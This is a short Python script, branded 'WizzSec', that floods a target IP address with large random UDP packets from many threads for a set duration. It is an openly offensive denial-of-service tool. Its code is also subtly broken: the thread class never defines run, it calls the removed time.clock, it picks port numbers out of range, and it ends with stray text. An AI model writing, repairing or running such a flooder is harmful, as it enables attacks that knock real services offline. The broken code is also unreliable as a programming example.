import random
import threading
import socket
import sys
import time
import os

port = int(sys.argv[2])
randport=(True,False)[port==0]
ip = sys.argv[1]
dur = int(sys.argv[3])
clock=(lambda:0,time.clock)[dur>0]
duration=(1,(clock()+dur))[dur>0]
print('@WizzSec Attack Ip: %s:%s SEC GANG %s IKEEHH'%(ip,port,dur or 'infinite'))

class WizzSec(threading.Thread):

    def WizzSec(self):
        while True:
            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            bytes=random._urandom(65500)
            while True:
                port=(random.randint(1,15000000),port)[randport]
                if clock()<duration:
                    sock.sendto(bytes,(ip,port))
                else:
                    break

if __name__ == '__main__':
    try:
        for x in range(100):
            wizzsec = WizzSec()
            wizzsec.start()
            time.sleep(100)
            
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ('XXXXXXXXXXXXXX')
        print ('X EROR GOVLK X')
        print ('XXXXXXXXXXXXXX')
        print ('X Author: WizzSec')￼Enter
